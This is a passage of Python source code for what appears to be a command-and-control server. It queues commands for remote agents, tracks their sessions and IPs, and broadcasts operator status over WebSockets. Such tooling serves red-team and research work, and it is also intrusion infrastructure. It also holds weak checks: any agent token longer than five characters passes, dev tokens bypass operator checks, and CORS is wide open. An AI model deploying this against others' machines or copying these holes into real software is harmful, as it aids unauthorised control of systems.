    # -------------------
    # Core C2 Functions
    # -------------------
    async def _get_pending_tasks_async(self, agent_id: str) -> List[Dict]:
        loop = asyncio.get_event_loop()
        tasks = await loop.run_in_executor(
            None,
            self._sync_get_pending_tasks,
            agent_id
        )
        return tasks

    def _sync_get_pending_tasks(self, agent_id: str) -> List[Dict]:
        conn = None
        try:
            conn = self.get_db()
            c = conn.cursor()

            # READ ONLY - Get pending tasks
            c.execute("""
                SELECT id, command, args, operator_id, created_at
                FROM tasks
                WHERE agent_id = ? AND status = 'pending'
                ORDER BY priority DESC, created_at ASC
                LIMIT 10
            """, (agent_id,))

            rows = c.fetchall()
            tasks = []
            task_ids = []

            for row in rows:
                task_id = row[0]
                command = row[1]
                args_json = row[2]
                operator_id = row[3]
                created_at = row[4]

                args = json.loads(args_json) if args_json else []
                tasks.append({
                    "task_id": task_id,
                    "command": command,
                    "args": args,
                    "operator_id": operator_id,
                    "created_at": created_at
                })
                task_ids.append(task_id)

            conn.close()
            conn = None

            # WRITE OPERATION - Update task status (SEPARATE CONNECTION)
            if task_ids:
                write_conn = self.get_db()
                write_c = write_conn.cursor()
                for task_id in task_ids:
                    write_c.execute("UPDATE tasks SET status = 'dispatched' WHERE id = ?", (task_id,))
                write_conn.commit()
                write_conn.close()

            return tasks

        except Exception as e:
            logger.error(f"Error getting pending tasks: {e}")
            return []
        finally:
            if conn:
                conn.close()

    def _update_session(self, agent_id: str, ip: str, status: str = "active"):
        self.active_sessions[agent_id] = {
            "last_seen": self._now_iso(),
            "ip": ip,
            "status": status,
            "agent_id": agent_id
        }

    def _cleanup_inactive_sessions(self):
        cutoff = self._now() - timedelta(minutes=3)
        for agent_id, session in list(self.active_sessions.items()):
            last_seen_str = session.get("last_seen")
            if last_seen_str:
                try:
                    last_seen = self._parse_iso(last_seen_str)
                    if last_seen < cutoff:
                        session["status"] = "offline"
                        if last_seen < self._now() - timedelta(hours=24):
                            if agent_id in self.agent_keys:
                                del self.agent_keys[agent_id]
                except Exception as e:
                    logger.error(f"Error parsing session timestamp: {e}")

    # -------------------
    # WebSocket Endpoints
    # -------------------
    def _setup_websocket(self):
        @self.app.websocket("/ws")
        async def websocket_endpoint(websocket: WebSocket):
            await websocket.accept()
            self.websocket_connections.append(websocket)
            try:
                while True:
                    msg = await websocket.receive_text()
                    await websocket.send_text(f"ACK: {msg}")
            except WebSocketDisconnect:
                self._remove_websocket(websocket)
            except Exception as e:
                logger.error(f"WebSocket error: {e}")
                self._remove_websocket(websocket)

    def _setup_team_websocket(self):
        @self.app.websocket("/ws/team")
        async def team_websocket(websocket: WebSocket):
            await websocket.accept()
            self.websocket_connections.append(websocket)
            try:
                initial_state = await self._get_team_state()
                await websocket.send_json({
                    'type': 'initial_state',
                    'data': initial_state
                })
                while True:
                    try:
                        data = await websocket.receive_json()
                        if data.get('type') == 'ping':
                            await websocket.send_json({'type': 'pong'})
                        elif data.get('type') == 'get_state':
                            state = await self._get_team_state()
                            await websocket.send_json({
                                'type': 'state_update',
                                'data': state
                            })
                    except WebSocketDisconnect:
                        break
            except Exception as e:
                logger.error(f"Team WebSocket error: {e}")
            finally:
                self._remove_websocket(websocket)

    def _remove_websocket(self, websocket: WebSocket):
        try:
            if websocket in self.websocket_connections:
                self.websocket_connections.remove(websocket)
        except:
            pass

    async def _broadcast_to_team(self, message: Dict):
        dead_connections = []
        for connection in self.websocket_connections:
            try:
                await connection.send_json(message)
            except Exception as e:
                logger.error(f"Broadcast error: {e}")
                dead_connections.append(connection)
        for connection in dead_connections:
            self._remove_websocket(connection)

    async def _broadcast_status_updates(self):
        while not self.is_shutting_down:
            await asyncio.sleep(30)
            try:
                state = await self._get_team_state()
                await self._broadcast_to_team({
                    'type': 'status_update',
                    'data': state
                })
            except Exception as e:
                logger.error(f"Status broadcast error: {e}")

    async def _get_team_state(self) -> Dict:
        # READ operation - no lock needed
        conn = self.get_db()
        c = conn.cursor()
        try:
            c.execute("SELECT COUNT(*) FROM agents")
            total_agents = c.fetchone()[0] or 0
            c.execute("SELECT COUNT(*) FROM tasks WHERE status = 'pending' OR status = 'dispatched'")
            pending_tasks = c.fetchone()[0] or 0
            c.execute("SELECT COUNT(*) FROM tasks WHERE status = 'completed'")
            completed_tasks = c.fetchone()[0] or 0
            c.execute("SELECT COUNT(*) FROM operators WHERE is_active = 1")
            active_operators = c.fetchone()[0] or 1
        except Exception as e:
            logger.error(f"Error getting team state: {e}")
            total_agents = 0
            pending_tasks = 0
            completed_tasks = 0
            active_operators = 1
        conn.close()

        return {
            'server_id': self.server_id,
            'timestamp': self._now_iso(),
            'total_agents': total_agents,
            'online_agents': len([s for s in self.active_sessions.values() if s.get('status') in ['active', 'registered']]),
            'pending_tasks': pending_tasks,
            'completed_tasks': completed_tasks,
            'active_operators': active_operators,
            'websocket_connections': len(self.websocket_connections),
            'active_sessions': len(self.active_sessions)
        }

    # -------------------
    # Background Tasks
    # -------------------
    async def _cleanup_old_sessions_loop(self):
        while not self.is_shutting_down:
            await asyncio.sleep(60)
            try:
                self._cleanup_inactive_sessions()
            except Exception as e:
                logger.error(f"Error cleaning up sessions: {e}")

    async def _update_agent_status_loop(self):
        while not self.is_shutting_down:
            await asyncio.sleep(30)
            try:
                await self._execute_write("""
                    UPDATE agents
                    SET status = 'offline'
                    WHERE last_seen < ?
                """, ((self._now() - timedelta(minutes=2)).isoformat(),))
            except Exception as e:
                logger.error(f"Error updating agent status: {e}")

    async def _cleanup_old_tasks_loop(self):
        while not self.is_shutting_down:
            await asyncio.sleep(3600)
            try:
                await self._execute_write("""
                    DELETE FROM tasks
                    WHERE status = 'completed' AND executed_at < ?
                """, ((self._now() - timedelta(hours=24)).isoformat(),))

                await self._execute_write("""
                    DELETE FROM tasks
                    WHERE status = 'failed' AND executed_at < ?
                """, ((self._now() - timedelta(hours=12)).isoformat(),))

                logger.info("Cleaned up old tasks")
            except Exception as e:
                logger.error(f"Error cleaning up old tasks: {e}")

    # -------------------
    # Security and Authentication
    # -------------------
    def _verify_operator_token(self, token: str) -> bool:
        if token in DEV_TOKENS:
            return True
        # READ operation - no lock needed
        conn = self.get_db()
        c = conn.cursor()
        try:
            c.execute("SELECT COUNT(*) FROM operators WHERE id = ? AND is_active = 1", (token,))
            count = c.fetchone()[0]
            conn.close()
            return count > 0
        except:
            conn.close()
            return False

    def _verify_agent_token(self, token: str) -> bool:
        return bool(token) and len(token) > 5

    # -------------------
    # Middleware Setup
    # -------------------
    def _setup_middleware(self):
        self.app.add_middleware(
            CORSMiddleware,
            allow_origins=["*"],
            allow_credentials=True,
            allow_methods=["*"],
            allow_headers=["*"],
        )


